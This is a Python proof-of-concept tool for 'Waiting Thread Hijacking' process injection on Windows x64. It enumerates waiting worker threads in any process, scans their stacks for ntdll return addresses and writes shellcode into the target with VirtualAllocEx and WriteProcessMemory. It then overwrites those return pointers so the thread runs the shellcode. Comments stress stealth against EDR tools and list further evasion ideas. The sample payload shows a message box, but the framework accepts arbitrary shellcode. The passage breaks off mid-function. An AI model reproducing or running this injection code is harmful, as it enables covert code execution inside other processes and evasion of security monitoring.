"""
(prod) Waiting Thread Hijacking, aka Stack Bombs, Threadless Injection
- arch: x64 process/host
- target: (any process)
- payload: shellcode [default: spawn MessageBoxW()]


Overview
--------
- this technique targets worker threads already in a waiting state (ie WrQueue)
- the thread's stack, is parsed to discover a stack pointer that returns into ntdll.dll
- the original memory address in that pointer, is included at the end of shellcode, so that the parent-process execution resumes once shellcode execution completes
- the pointer is then over-written (poisoned) with the address of the injected shellcode
- once the thread wakes up and attempts to return into ntdll, it instead returns into the memory address where the shellcode exists

This technique attempts to be more stealthy, by avoiding 'noisy' API calls such as CreateRemoteThread() and SetThreadContext()


Caveats
-------
- execution of shellcode may not happen immediately, unless thread wakes up (can force it by manipulating/using application)
- if targeting the same process multiple times (eg notepad.exe) shellcode execution will only occur on the first run 
  subsequent attempts will likely target the same thread, and shellcode will not execute again due to stack shift
  shellcode does not currently take this into account, so if the same application is to be targeted, it will need to be restarted in between attempts


WTH Steps
---------

1. Identify suitable threads ✅
- provide list of process/PIDs with eligible threads, where 'State' == Waiting and  'Wait Reason' == WrQueue
- NtQuerySystemInformation()

2. Determine the stack-space for the given thread ✅
- identify the thread's StackBase and StackLimit
- this determines stack-size/buffer, to search for pointers that point back to ntdll.dll
- NtQueryInformationThread() -> THREAD_BASIC_INFORMATION() struct -> tbi.TebAddress -> [TEB][TIB] -> StackBase / StackLimit

3. Investigate thread's stack-space for Rip/Rsp pairs ✅
- on X64, the stack is a series of 8-byte (64-bit) chunks
- in this thread's stack space, query each 8-byte chunk for possible stack pointers (Rsp)
- determine if chunk contains possible Instruction Pointers (Rip) that return back into ntdll.dll
- where a valid value (of the chunk) falls within the memory range of ntdll.dll
- ntdll.dll -> GetModuleHandleW() -> GetModuleInformation() -> ReadProcessMemory()

Note:
- Rsp represents the memory address of the 'chunk', and Rip is the value inside the 'chunk'
- multiple pairs retrieved, as be numerous 'chunks' appear to return back into ntdll.dll (false positives)
- from testing -> the second pair appears to contain the correct Rip

4. Generate payload ✅
- the shellcode will be appended with the above possible Rip -> this contains the original return pointer
- once shellcode execution completes, the shellcode will return to this address
- this ensures that the targeted process continues normally and doesn't crash

5. Allocate + Inject Payload ✅
- allocate memory and write your shellcode into the target process
- VirtualAllocEx() -> WriteProcessMemory()

6. Poison the Stack ✅
- due to numerous false positives, 'spray and pray' approach adopted here
- here we spray first three possible Rsp chunks, which are over-written with the memory address of where the shellcode resides
- WriteProcessMemory()

7. Pray ✅
- when OS assigns a task to thread, it will "return" directly into shellcode
- wait for this to occur naturally, or attempt to force it through usage of application


TODO:
-----
- instead of 'Pray' -> Fake Work Packet
- modify memory-protection value for shellcode in stages -> apparently PAGE_EXECUTE_READ blinds EDRs
- investigate Module Stomping, vs VirtualAllocEx() -> find legit .dll in target process with large unused padding section, write shellcode there


Admission:
----------
- I am by no means proficient with shellcode, at all...
- Google AI/ChatGPT etc used extensively to generate required working payload -> create_payload_cowboy()
- as msfvenom generated payloads appeared to be stomping registers, even with EXITFUNC=thread set, crashing parent process, even if appended with infinite loop

"""

import ctypes
from ctypes import wintypes
from collections import defaultdict
from contextlib import contextmanager
import msvcrt
import struct




# ----------------------------------
# Load required libraries
# ----------------------------------

kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll    = ctypes.WinDLL('ntdll.dll',    use_last_error=True)
psapi    = ctypes.WinDLL('psapi.dll',    use_last_error=True)
user32   = ctypes.WinDLL('user32.dll',   use_last_error=True)   # for MessageBoxW() payload




# ----------------------------------
# CONSTANTS
# ----------------------------------

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# OpenProcess()
PROCESS_ALL_ACCESS = 0x1F0FFF               # likely to fail unless run elevated/as-admin
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000  # alternative, minimal privileges required

# OpenThread()
THREAD_ALL_ACCESS           = 0x1FFFFF
THREAD_QUERY_INFORMATION    = 0x0040


# VirtualAllocEx() / VirtualProtectEx () - samples
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80


# Stack and memory alignment
STACK_SIZE      = 0x1000    # 4KB (one page)
SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment


# SYSTEM_THREAD_INFORMATION
    # ----- WaitReason (samples) -----
    # NOTE: values are for Windows 10/11, older Win7 values are different
EXECUTIVE       = 0
SUSPEND         = 5
WRPREEMPTION    = 12
WRQUEUE         = 15
WRLPCRECEIVE    = 16

    # ----- ThreadState (samples) -----
INITIALIZED     = 0
READY           = 1
RUNNING         = 2
STANDBY         = 3
TERMINATED      = 4
WAITING         = 5
TRANSITION      = 6
DEFERREDREADY   = 7


# NtQueryXXX()
STATUS_SUCCESS              = 0
NEG_RETURN_STATUS           = 0xFFFFFFFF
SYSTEMPROCESSINFORMATION    = 5
PADDING                     = 0x4000
ThreadBasicInformation      = 0



# --------------- Mapping dictionary for common memory constants ---------------
MEM_STATE = {0x1000: "MEM_COMMIT", 0x2000: "MEM_RESERVE", 0x10000: "MEM_FREE"}
MEM_TYPE = {0x20000: "MEM_PRIVATE", 0x40000: "MEM_MAPPED", 0x1000000: "MEM_IMAGE"}
PAGE_PROTECT = {
    0x01: "PAGE_NOACCESS",
    0x02: "PAGE_READONLY",
    0x04: "PAGE_READWRITE",
    0x10: "PAGE_EXECUTE",
    0x20: "PAGE_EXECUTE_READ",
    0x40: "PAGE_EXECUTE_READWRITE"
}




# ----------------------------------
# Struct Definitions
# ----------------------------------

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", wintypes.WORD),
        ("RegionSize", ctypes.c_size_t),        # <--- This is the size
        ("State", wintypes.DWORD),              # 0x1000 = MEM_COMMIT
        ("Protect", wintypes.DWORD),            # 0x40 = PAGE_EXECUTE_READWRITE
        ("Type", wintypes.DWORD),               # 0x20000 = MEM_PRIVATE
    ]




# from MsDocs - SYSTEM_THREAD_INFORMATION
# ---------------------------------------
# When the SystemInformationClass parameter is SystemProcessInformation
# - buffer pointed to by SystemInformation, contains a SYSTEM_PROCESS_INFORMATION structure for each process 
#
# Each of these structs is immediately followed a SYSTEM_THREAD_INFORMATION struct(s)
# - provide info for each thread in the preceding process

class CLIENT_ID(ctypes.Structure):          # 16-bytes
    _fields_ = [
        ("UniqueProcess",   wintypes.HANDLE),
        ("UniqueThread",    wintypes.HANDLE),
    
    ]


class MODULEINFO(ctypes.Structure):
    _fields_ = [
        ("lpBaseOfDll", wintypes.LPVOID),
        ("SizeOfImage", wintypes.DWORD),
        ("EntryPoint",  wintypes.LPVOID),
    ]


class SYSTEM_THREAD_INFORMATION(ctypes.Structure): # 80-bytes
    _fields_ = [
        ("KernelTime",      ctypes.c_longlong),
        ("UserTime",        ctypes.c_longlong),
        ("CreateTime",      ctypes.c_longlong),
        ("WaitTime",        ctypes.c_ulong),
        ("StartAddress",    ctypes.c_void_p),
        ("ClientId",        CLIENT_ID),
        ("Priority",        ctypes.c_long),
        ("BasePriority",    ctypes.c_long),
        ("ContextSwitches", ctypes.c_ulong),
        ("ThreadState",     ctypes.c_ulong),
        ("WaitReason",      ctypes.c_ulong),
    ]


class THREAD_BASIC_INFORMATION(ctypes.Structure): # NOTE: Needs to be 48-bytes
    _fields_ = [
        ("ExitStatus",      ctypes.c_long),
        ("Padding1",        ctypes.c_int),
        ("TebBaseAddress",  ctypes.c_void_p), # This points to the TEB
        ("ClientId",        CLIENT_ID),
        ("AffinityMask",    ctypes.c_void_p),
        ("Priority",        ctypes.c_long),
        ("BasePriority",    ctypes.c_long),
    ]


class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length",          wintypes.USHORT),
        ("MaximumLength",   wintypes.USHORT),
        ("Buffer",          wintypes.LPWSTR),
    ]
    
# this acts as the header
# - in memory, an array of SYSTEM_THREAD_INFORMATION() structs follows this struct
class SYSTEM_PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("NextEntryOffset",                 ctypes.c_ulong),
        ("NumberOfThreads",                 ctypes.c_ulong),
        ("WorkingSetPrivateSize",           ctypes.c_longlong),
        ("HardFaultCount",                  ctypes.c_ulong),
        ("NumberOfThreadsHighWatermark",    ctypes.c_ulong),
        ("CycleTime",                       ctypes.c_ulonglong),
        ("CreateTime",                      ctypes.c_longlong),
        ("UserTime",                        ctypes.c_longlong),
        ("KernelTime",                      ctypes.c_longlong),
        ("ImageName",                       UNICODE_STRING),
        ("BasePriority",                    ctypes.c_long),
        ("UniqueProcessId",                 wintypes.HANDLE),
        ("InheritedFromUniqueProcessId",    wintypes.HANDLE),
        ("HandleCount",                     ctypes.c_ulong),
        ("SessionId",                       ctypes.c_ulong),
        ("UniqueProcessKey",                ctypes.c_void_p),
        ("PeakVirtualSize",                 ctypes.c_size_t),
        ("VirtualSize",                     ctypes.c_size_t),
        ("PageFaultCount",                  ctypes.c_ulong),
        ("PeakWorkingSetSize",              ctypes.c_size_t),
        ("WorkingSetSize",                  ctypes.c_size_t),
        ("QuotaPeakPagedPoolUsage",         ctypes.c_size_t),
        ("QuotaPagedPoolUsage",             ctypes.c_size_t),
        ("QuotaPeakNonPagedPoolUsage",      ctypes.c_size_t),
        ("QuotaNonPagedPoolUsage",          ctypes.c_size_t),
        ("PagefileUsage",                   ctypes.c_size_t),
        ("PeakPagefileUsage",               ctypes.c_size_t),
        ("PrivatePageCount",                ctypes.c_size_t),
        ("ReadOperationCount",              ctypes.c_longlong), # from here, appears to be part of a separate IO_COUNT struct, however embedding directly here
        ("WriteOperationCount",             ctypes.c_longlong),
        ("OtherOperationCount",             ctypes.c_longlong),
        ("ReadTransferCount",               ctypes.c_longlong),
        ("WriteTransferCount",              ctypes.c_longlong),
        ("OtherTransferCount",              ctypes.c_longlong),
        
    ]






# ----------------------------------
# Function Prototypes
# ----------------------------------

# --------------- kernel32.dll ---------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateToolhelp32Snapshot.argtypes=[
    wintypes.DWORD,             # dwFlags
    wintypes.DWORD,             # th32ProcessID
]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

kernel32.GetModuleHandleW.argtypes = [
    wintypes.LPCWSTR,           # lpModuleName
]
kernel32.GetModuleHandleW.restype = wintypes.HANDLE

kernel32.GetProcAddress.argtypes = [
    wintypes.HMODULE,           # hModule
    wintypes.LPCSTR,            # lpProcName
]
kernel32.GetProcAddress.restype = ctypes.c_void_p

kernel32.GetThreadId.argtypes = [ wintypes.HANDLE, ]
kernel32.GetThreadId.restype = wintypes.DWORD

kernel32.GetThreadTimes.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(wintypes.FILETIME),  # lpCreationtime
    ctypes.POINTER(wintypes.FILETIME),  # lpExitTime
    ctypes.POINTER(wintypes.FILETIME),  # lpKernelTime
    ctypes.POINTER(wintypes.FILETIME),  # lpUserTime
]    
kernel32.GetThreadTimes.restype = wintypes.BOOL

kernel32.LoadLibraryW.argtypes = [
    wintypes.LPCWSTR,   # lpLibFileName
]
kernel32.LoadLibraryW.restype = wintypes.HANDLE

kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwThreadId
]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.VirtualQueryEx.argtypes = [
    wintypes.HANDLE,                            # hProcess
    wintypes.LPCVOID,                           # lpAddress (opt) 
    ctypes.POINTER(MEMORY_BASIC_INFORMATION),   # [o] lpBuffer
    ctypes.c_size_t,                            # dwLength
]
kernel32.VirtualQueryEx.restype = ctypes.c_size_t

kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# --------------- ntdll.dll ---------------


ntdll.NtQuerySystemInformation.argtypes = [
    ctypes.c_int,                       # SystemInformationClass
    ctypes.c_void_p,                    # [i/o] SystemInformation
    ctypes.c_ulong,                     # SystemInformationLength
    ctypes.POINTER(ctypes.c_ulong),     # [o] ReturnLength (opt)
]
ntdll.NtQuerySystemInformation.restype = ctypes.c_long

ntdll.NtQueryInformationThread.argtypes = [
    wintypes.HANDLE,                    # ThreadHandle
    ctypes.c_int,                       # ThreadInformationClass
    ctypes.c_void_p,                    # [i/o] ThreadInformation (buffer)
    ctypes.c_ulong,                     # ThreadInformationLength
    ctypes.POINTER(ctypes.c_ulong),     # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationThread.restype = ctypes.c_long


# --------------- psapi.dll ---------------
psapi.GetModuleInformation.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.HANDLE,                    # hModule
    ctypes.POINTER(MODULEINFO),         # [o] lpmodinfo
    wintypes.DWORD,                     # cb, size of MODULEINFO (bytes)
]
psapi.GetModuleInformation.restype = wintypes.BOOL




# ----------------------------------
# Function Definitions
# ----------------------------------

# --------------- Misc helper functions ---------------
def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(id_number: int, handle: wintypes.HANDLE, name: str="Handle", ) -> None:
    """ Close open handles, to prevent resource leaks """

    if name == "Snapshot":
        print(f"\n[+] Closing Handle to {name}: ", end='')
    else:
        print(f"    -> Closing Handle to {name}: ", end='')
    
    if handle is None or handle.value == 0:
        raise ValueError(f"[!] Warning: {name} is None or invalid, nothing to close")

    if not kernel32.CloseHandle(handle):
        print(f"[!] Failed! {name} handle: {handle}, Error: {winerr()}")
    else:
        print(f"Success ({handle.value}) [{name} ID: {id_number}]")


def key_sort(name: str) -> str:
    """ Ensure processes sorted alphabetically, regardless of case """
    return name.casefold()


def pause() -> None:
    """ Pause until user key press (any) """
    msg = "\nPress any key to continue..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


# --------------- Payload Prep ---------------


def get_message_box_addr() -> ctypes.c_void_p:
    """ Get memory address for MessageBoxW() """
    handle_user32 = kernel32.LoadLibraryW("user32.dll")
    
    print(f"\n[+] Obtaining address for MessageBoxW: ", end='')
    msgbox_addr = kernel32.GetProcAddress(handle_user32, b"MessageBoxW")

    if not msgbox_addr:
        raise winerr()
        
    print(f"Success: {hex(msgbox_addr)}")
    
    return msgbox_addr




def create_payload_cowboy(
    hThread: wintypes.HANDLE,
    msgbox_addr: int,
    original_rip: int) -> bytes:
    """ Shellcode to spawn MessageBoxW() - aligns its own stack (16-byte) and uses a 'jmp' instead of 'ret' to return """


    # setup MessageBoxW()
    title = "Hello There"
    caption = "Cowboy!"
    title_b = (title + '\0').encode('utf-16le')
    caption_b = (caption + '\0').encode('utf-16le')


    shellcode = bytearray()

    # 1. Save state and align
    shellcode += b'\x50'                          # push rax
    shellcode += b'\x51'                          # push rcx
    shellcode += b'\x52'                          # push rdx
    shellcode += b'\x41\x50'                      # push r8
    shellcode += b'\x41\x51'                      # push r9
    
    # 2. FORCE 16-byte alignment & Save RSP
    shellcode += b'\x48\x89\xe0'                  # mov rax, rsp
    shellcode += b'\x48\x83\xe4\xf0'              # and rsp, -16
    shellcode += b'\x48\x83\xec\x30'              # sub rsp, 0x30
    shellcode += b'\x48\x89\x44\x24\x28'          # mov [rsp+0x28], rax

    # 3. Setup Args
    shellcode += b'\x48\x31\xc9'                  # xor rcx, rcx (HWND=0)
    
    # RDX = lpText ("Cowboy!")
    rdx_patch = len(shellcode) + 3
    shellcode += b'\x48\x8d\x15\x00\x00\x00\x00'  
    
    # R8 = lpCaption ("Hello There,")
    r8_patch = len(shellcode) + 3
    shellcode += b'\x4c\x8d\x05\x00\x00\x00\x00'  
    
    # R9 = uType (MB_SERVICE_NOTIFICATION | MB_TOPMOST | MB_SETFOREGROUND)
    shellcode += b'\x41\xb9\x00\x00\x25\x00' 

    # 4. Call MessageBoxW
    shellcode += b'\x48\xb8' + struct.pack('<Q', msgbox_addr)
    shellcode += b'\xff\xd0'                      # call rax

    # 5. Restore stack and registers
    shellcode += b'\x48\x8b\x64\x24\x28'          # mov rsp, [rsp+0x28]
    shellcode += b'\x41\x59'                      # pop r9
    shellcode += b'\x41\x58'                      # pop r8
    shellcode += b'\x5a'                          # pop rdx
    shellcode += b'\x59'                          # pop rcx
    shellcode += b'\x58'                          # pop rax
    
    # 6. RETURN to original_rip 
    shellcode += b'\x48\xb8' + struct.pack('<Q', original_rip) # mov rax, [original_rip] 
    shellcode += b'\xff\xe0'                      # jmp rax

    # --- Patching String Offsets ---
    while len(shellcode) % 8 != 0: shellcode += b'\x90'
    
    # Patch RDX to point to text_b ("Cowboy!")
    shellcode[rdx_patch:rdx_patch+4] = struct.pack('<i', len(shellcode) - (rdx_patch + 4))
    shellcode += caption_b
    
    # Patch R8 to point to title_b ("Hello There,")
    shellcode[r8_patch:r8_patch+4] = struct.pack('<i', len(shellcode) - (r8_patch + 4))
    shellcode += title_b

    print(f"[+] Shellcode Payload generated: {len(shellcode)} Bytes")

    return bytes(shellcode)
    

# --------------- Thread Id information ---------------


def get_wrqueue_threads(target_pid: int | None = None) ->  dict[str, dict[int, int]] | tuple[wintypes.HANDLE, int] | None:
    """
    If target_pid is None: returns full list of threads in required state (Waiting + WrQueue)
    - returns: dict{name: {pid: count}}
    
    If target_pid IS provided, returns (hThread, tid) for first valid worker-thread found
    """
    
    # double-call / probe for required buffer size
    size = ctypes.c_ulong(0)
    ntdll.NtQuerySystemInformation(SYSTEMPROCESSINFORMATION, None, 0, ctypes.byref(size))

    # allocate buffer with 16kb padding - for potential proc list growth
    buf_size = size.value + PADDING
    buf = ctypes.create_string_buffer(buf_size)

    # second call, retrieve actual data
    if ntdll.NtQuerySystemInformation(
            SYSTEMPROCESSINFORMATION,   # SystemInformationClass
            buf,                        # [i/o] SystemInformation
            buf_size,                   # SystemInformationLength
            ctypes.byref(size)          # [o] ReturnLength (opt)
    ) != STATUS_SUCCESS:
        return None


    # data structure: { "ProcessName": {PID: WrQueueThreadCount} }
    threads = defaultdict(lambda: defaultdict(int))
    current_spi_ptr = ctypes.addressof(buf)
    
    while True:
        """ Step through SPI() structs in buffer - next record offset contained in spi.NextEntryOffset """
        
        # ---------- Process Information ----------
        spi = SYSTEM_PROCESS_INFORMATION.from_address(current_spi_ptr)

        proc_name = spi.ImageName.Buffer if spi.ImageName.Buffer else "System Idle"
        pid = spi.UniqueProcessId



        # ---------- Thread Information ----------
        
        # optimisation - if only care about one PID, skips others
        if target_pid is None or pid == target_pid:

            # threads immediately follow the SYSTEM_PROCESS_INFORMATION() struct, ~ 0x100 on x64
            #thread_ptr = current_spi_ptr + ctypes.sizeof(SYSTEM_PROCESS_INFORMATION) # not used due to misalignment

            thread_ptr = current_spi_ptr + 0x100

            # iterate through threads
            for i in range(spi.NumberOfThreads):
                thread_addr = thread_ptr + (i * ctypes.sizeof(SYSTEM_THREAD_INFORMATION))
                sti = SYSTEM_THREAD_INFORMATION.from_address(thread_addr)
                
                if sti.ThreadState == WAITING and sti.WaitReason == WRQUEUE:
                    
                    # MODE 1: targeted PID
                    if target_pid is not None:
                        threadId_worker = int(sti.ClientId.UniqueThread)
                        
                        print(f"\n[+] Opening hHndle to target thread: OpenThread()")
                        hThread_worker = kernel32.OpenThread(THREAD_ALL_ACCESS, False, threadId_worker)
                        
                        if not hThread_worker:
                            raise winerr()
                        print(f"    -> ThreadId: {threadId_worker}")
                        print(f"    -> Handle: {hThread_worker}")


                        # not concerned about the main-thread being returned here
                        # - most likely a handle to a worker thread will be returned
                        return (wintypes.HANDLE(hThread_worker), threadId_worker)
                
                    # MODE2 : building entire list
                    threads[proc_name][pid] += 1
        
        # step to next SPI() in buffer
        if spi.NextEntryOffset == 0:
            break
        current_spi_ptr += spi.NextEntryOffset
        
    return threads




def print_wrqueue_threads(threads: dict[str, dict[int, int]]) -> None:
    """ Print output of threads in required state -> sorted alphabetically, then by thread count """
    
    sorted_threads = sorted(threads.items(), key=lambda item: item[0].casefold())
    
    for proc_name, pids in sorted_threads:
        print(f"\n[+] Process: {proc_name}")
        
        # sort pids by thread count (the value), descending order
        # item[1] refers to 'count' in (pid, count) tuple
        sorted_pids = sorted(pids.items(), key=lambda item: item[1], reverse=True)
        
        for pid, count in sorted_pids:
            print(f"    -> PID: {pid:<6} | Thread Count: {count}")




def request_pid(threads: dict[str, dict[int, int]]) -> int:
    """ Request PID (to target thread)  ->  0(1) validation against pid_lookup """

    pid_lookup = {pid: name for name, pids in threads.items() for pid in pids}
    
    while True:
        try:
            pid = int(input("\nPlease enter a valid PID: "))
            if pid > 0:
                if pid in pid_lookup:
                    print(f"\n[+] Pid found: {pid}\n    -> Process: {pid_lookup[pid]}")
                    return pid
            else:
                print("[!] Please enter a positive integer: ")
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def get_stack_boundaries(hThread: wintypes.HANDLE, hProcess: wintypes.HANDLE) -> tuple[ctypes.c_uint64, ctypes.c_uint64]:
    """
    Get Stack Base and Limit from TIB (Thread Information Block)
    - NtQueryInformationThread() <- populate TREAD_BASIC_INFORMATION() struct
    - tbi.TebBaseAddress -> TEB (Thread Environment Block) -> TIB (first field)
    - @ TBI, query known offsets @ 0x08 (StackBase) and @ 0x10 (StackLimit) 
    """

    tbi = THREAD_BASIC_INFORMATION()
    
    if ntdll.NtQueryInformationThread(
        hThread,                    # ThreadHandle
        ThreadBasicInformation,     # 0x00
        ctypes.byref(tbi),          # [i/o] ThreadInformation buffer
        ctypes.sizeof(tbi),         # ThreadInformationLength
        None                        # [o] ReturnLength (opt)
    ) != STATUS_SUCCESS:
        raise winerr()

    
    # ----- from tbi.TebBaseAddress, read StackBase and StackLimit
    sb_offset = 0x08
    stack_buffer = (ctypes.c_uint64 * 2)() # buffer to hold two 64-bit values, SB and SL

    print(f"\n[+] Determining StackBase and StackLimit boundaries:")

    if not kernel32.ReadProcessMemory(
            hProcess,
            tbi.TebBaseAddress + sb_offset,     # lpBaseAddress
            ctypes.byref(stack_buffer),         # [o] lpBuffer
            ctypes.sizeof(stack_buffer),        # nSize
            None                                # [o] *lpNumberOfBytesRead
    ):
        raise winerr()


    stack_base  = stack_buffer[0]
    stack_limit = stack_buffer[1]
    
    print(f"    -> StackBase:   {hex(stack_base)}")
    print(f"    -> StackLimit:  {hex(stack_limit)}")
    print(f"    -> Stack Size:  {hex(stack_base - stack_limit)}")
    
    return stack_base, stack_limit



def get_thread_return_addresses(hProcess: wintypes.HANDLE, stack_base: int, stack_limit: int) -> tuple[int, int]:
    """
    Search through the thread's stack-base/stack-limit (top -> bottom of stack)
    - for a stack location (target_rsp), that contains the return pointer (possible_rip) pointing to the ntdll.dll code section
    
    target_rsp:
    - memory address on the stack, that stores the pointer the thread will use to resume execution, when it wakes up
    - originally this contains the 'possible_rip', and originally points back to ntdll.dll
    - this stack location will be overwritten, to contain the memory address of the injected shellcode

    possible_rip: 
    - the original data/return-pointer from 'target_rsp' (before being overwritten/hijacked)
    - it is hardcoded to the end of the shellcode, to prevent the targeted process from crashing
    - it is a return address back to ntdll.dll, allowing the thread to jump back to its original path, once the shellcode finishes
    """
    
    # ---------- get ntdll.dll memory range ----------
    handle_ntdll = kernel32.GetModuleHandleW("ntdll.dll")
    if not handle_ntdll:
        raise winerr()

    # populate struct, to pull start/end addresses for ntdll.dll
    mi = MODULEINFO()
    if not psapi.GetModuleInformation(
            hProcess,           # hProcess
            handle_ntdll,       # hModule
            ctypes.byref(mi),   # [o] lpmodinfo
            ctypes.sizeof(mi)   # cb, size of MODINFO
    ):
        raise winerr()

    start_addr = mi.lpBaseOfDll
    end_addr = start_addr + mi.SizeOfImage


    # ---------- read stack ----------
    
    # - 'stack_limit' here because how ReadProcessMemory() works
    # - reads from low -> high addresses, with starting point being the low address
    stack_size = stack_base - stack_limit
    buffer = ctypes.create_string_buffer(stack_size)
    if not kernel32.ReadProcessMemory(hProcess, stack_limit, buffer, stack_size, None):
        raise winerr()


    # ---------- scan buffer ----------
    
    # look for possible Instruction Pointer (Rip), that contains a return address to ntdll.dll
    # - search in 8kb chunks -> range(start, stop, step)
    #
    # 'i' is just the position in the local buffer, from bottom of stack (stack_limit)
    # - and 'stack_size -8' is so struct.unpack_from() doesn't read outside-of/beyond buffer


    # SPRAY AND PRAY: here we will find three potential candidates, due to cached variables and false positives
    # - we will poison them all
    matches = []

    for i in range(stack_size -8, 0, -8):
        possible_rip = struct.unpack_from("<Q", buffer, i)[0]

        # check if the DATA, stored in 'possible_rip', points to ndtll.dll
        if start_addr <= possible_rip < end_addr:
            #target_rsp = stack_limit + i        # bottom/lowest point in stack
            matches.append((stack_limit + i, possible_rip))
            if len(matches) == 3:
                break
            '''
            print(f"    -> [MATCH] Found return pointer {hex(possible_rip)} at offset {i}")
            print(f"    -> Location on stack (Target Rsp): {hex(target_rsp)}")

            return target_rsp, possible_rip
            '''
    print(f"\n[+] List of potential ntdll.dll return pointers:")
    for rsp,rip in matches:
        print(f"    -> target_rsp: {hex(rsp)}, possible_rip: {hex(rip)}")

    return matches

    # return None, None   # in case Rsp not found - not likely, commenting out


# --------------- Memory Manipulation ---------------


def allocate_memory(
    hProcess: wintypes.HANDLE,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """ Allocate memory in remote process <- returns: ptr to memory address """

    print(f"\n[+] Allocating memory: ", end='')

    lpAddress = ctypes.c_void_p(0)  # return any address, not requesting any specific address
    ptr = kernel32.VirtualAllocEx(
            hProcess,
            lpAddress,
            dwSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    print(f"Base Address: {hex(ptr)}")
    return ptr




def allocate_memory_verification(hProcess: wintypes.HANDLE, lpAddress: int) -> None:
    """ Query MBI to verify memory has been allocated """
 
    mbi = MEMORY_BASIC_INFORMATION()
    
    
    print(f"\n[+] Verifying memory allocation: ", end='')
    if not kernel32.VirtualQueryEx(hProcess, lpAddress, ctypes.byref(mbi), ctypes.sizeof(mbi)):
        raise winerr()


    # ----- Fields/Formatting to make output look pretty -----
    match_addr = True if mbi.BaseAddress == lpAddress else False

    # use .get() to return hex, if constant isn't in the dictionary (CONSTANTS -> Mapped)
    state_str = MEM_STATE.get(mbi.State, hex(mbi.State))
    protect_str = PAGE_PROTECT.get(mbi.Protect, hex(mbi.Protect))
    type_str = MEM_TYPE.get(mbi.Type, hex(mbi.Type))

    V = 16

    print("Success")
    print(f"    -> Base Address:   {hex(mbi.BaseAddress):<{V}} (Match above: {match_addr})")
    print(f"    -> Region Size:    {hex(mbi.RegionSize):<{V}} ({mbi.RegionSize} Bytes)")
    print(f"    -> State:          {hex(mbi.State):<{V}} ({state_str})")
    print(f"    -> Protect:        {hex(mbi.Protect):<{V}} ({protect_str})")
    print(f"    -> Type:           {hex(mbi.Type):<{V}} ({type_str})")


# --------------- Write -------------------------


def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: ", end='')

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print("Success")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")
    print(f"    -> Bytes written: {n_written.value}")




def write_payload_verification(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
    ):
    
    """ Verify that the memory written, matches the payload """
    
